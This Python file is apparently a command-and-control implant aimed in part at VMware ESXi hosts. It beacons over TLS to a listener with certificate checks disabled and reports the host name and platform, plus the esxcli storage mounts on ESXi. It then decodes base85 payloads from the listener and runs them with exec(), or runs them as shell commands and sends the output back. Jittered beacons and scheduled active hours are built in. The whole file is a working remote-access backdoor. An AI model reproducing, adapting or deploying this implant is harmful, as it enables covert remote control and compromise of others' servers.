import platform
import socket
import ssl
import hashlib
import json
import subprocess
import time
import base64
import datetime
import logging
import os
from random import randrange

_LISTENER_HOST = 'localhost'
_LISTENER_PORT = 1235
_LISTENER_SECRET = 'whatever'

_AGENT_BEACON_INTERVAL = 0.1
_AGENT_BEACON_JITTER = 2
_AGENT_START_TIME = datetime.time(0, 0, 0)
_AGENT_END_TIME = datetime.time(23, 59, 0)
_AGENT_CMD_TIMEOUT = 25

_AGENT_CIPHERS = 'AES128-SHA'
_AGENT_SOCKET_TIMEOUT = 2
_AGENT_LOGLEVEL = logging.DEBUG

# _AGENT_STAT_ENUM stores state machine state with following enumerations:
#
# 0     Not Associated, Attempt Association
# 1     Associated, Send beacons
# 2     Running command or payload
_AGENT_STATE_ENUM = 0

def enum_host():
    logging.debug('Enumerating host')
    host_platform = platform.platform()
    host_name = socket.gethostname()
    
    host_data = {
        'host_platform': host_platform,
        'host_name': host_name
    }

    enumdata = {
        'host_data': host_data,
        'agent_max_beacon_interval': _AGENT_BEACON_INTERVAL + _AGENT_BEACON_JITTER
    }

    if 'VMkernel' in host_platform:
        logging.debug('Beginning platform-specific ESXi enumeration')

        logging.debug('Enumerating mounts')
        host_mounts = {}
        m_fs_mounts = os.popen('esxcli storage filesystem list | grep ^/').read()
        for entry in m_fs_mounts.splitlines():
            entry = entry.split()
            m_mountpoint = entry[0]
            m_handle = entry[1]
            m_uuid = entry[2]
            m_type = entry[4]
            m_size = entry[5]
            m_free = entry[6]
            host_mounts[m_uuid] = {
                'mountpoint': m_mountpoint,
                'name': m_handle,
                'type': m_type,
                'size': m_size,
                'free': m_free,
            }
        host_data['host_mounts'] = host_mounts

        



    logging.debug(enumdata)

    return enumdata


def get_uuid():
    """
    Method to generate UUID from host parameters for
    agent persistence.
    """
    logging.debug('Generating UUID')
    uuid_components = [
        socket.gethostname()
    ]
    agent_uuid = hashlib.md5(''.join(uuid_components).encode()).hexdigest()
    logging.debug(agent_uuid)
    return agent_uuid


def tls_transact_msg(msg):
    """
    Method to allow the client to send a message to
    the listener using TLS.
    """
    logging.debug('Preparing to send packet')
    context = ssl.create_default_context()
    context.set_ciphers(_AGENT_CIPHERS)
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    try:
        logging.debug('Connecting socket')
        sock = socket.create_connection((_LISTENER_HOST, _LISTENER_PORT))
        sock.settimeout(_AGENT_SOCKET_TIMEOUT)
        logging.debug('Upgrading to TLS')
        ssock = context.wrap_socket(sock, server_hostname=_LISTENER_HOST)
        logging.debug('Sending packet')
        logging.debug('AGENT    : ' + msg)
        ssock.send(msg.encode())
        response = ssock.recv(12000)
        logging.debug('LISTENER : ' + response.decode())
        ssock.close()
    except Exception as e:
        logging.error(e)
        response = False
    return response


def associate():
    """
    Association method. Creates the following packet structure:
    Association:
        _associate{ secret:"mysecret", uuid:"myuuid" }
    """
    logging.debug('Associating agent')
    associate_packet_stub = {
        'secret': _LISTENER_SECRET,
        'uuid': get_uuid(),
        'enumdata': enum_host()
    }
    associate_pkt = ('_associate' + json.dumps(associate_packet_stub))
    return tls_transact_msg(associate_pkt)


def beacon():
    """
    Beacon method. Creates the following packet structure:
    Beacon:
        _beacon{ secret:"mysecret", uuid:"myuuid" }
    """
    logging.debug('Beaconing listener')
    beacon_packet_stub = {
        'secret': _LISTENER_SECRET,
        'uuid': get_uuid()
    }
    beacon_pkt = ('_beacon' + json.dumps(beacon_packet_stub))
    return tls_transact_msg(beacon_pkt)


def respond(msg):
    """
    Respond method. Creates the following packet structure:
    Response:
        _response{ secret:"mysecret", uuid:"myuuid", data:"cmd_response" }
    """
    logging.debug('Responding to listener')
    response_packet_stub = {
        'secret': _LISTENER_SECRET,
        'uuid': get_uuid(),
        'data': msg
    }
    response_pkt = ('_response' + json.dumps(response_packet_stub))
    return tls_transact_msg(response_pkt)


def run_payload(payload):
    logging.debug('Running a payload')
    logging.debug('========== Payload ==========')
    script = base64.b85decode(payload).decode().lstrip()
    logging.debug(script)
    try:
        exec(script)
    except Exception as e:
        error_pkt = {
            'status': 'PAYLOAD_ERROR',
            'error': str(e)
        }
        respond(error_pkt)


def run_command(command):
    logging.debug('Running a command')
    command = base64.b85decode(command).decode()
    logging.debug('Command: ' + command)
    sp = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    sp_ret = sp.stdout.read()
    respond(sp_ret.decode())

logging.basicConfig(level=_AGENT_LOGLEVEL, 
                    format='%(asctime)s %(message)s')

logging.debug('Starting agent')

while True:
    time.sleep(_AGENT_BEACON_INTERVAL + randrange(_AGENT_BEACON_JITTER))
    if (_AGENT_START_TIME <= datetime.datetime.now().time() <= _AGENT_END_TIME):
        if _AGENT_STATE_ENUM == 0:
            if associate():
                _AGENT_STATE_ENUM = 1
        if _AGENT_STATE_ENUM == 1:
            beacon_response = beacon()
            if beacon_response == False:
                _AGENT_STATE_ENUM = 0
                pass
            else:
                cmd = json.loads(beacon_response[9:])
                if cmd['payload']:
                    run_payload(cmd['payload'])
                if cmd['command']:
                    run_command(cmd['command'])

            
        
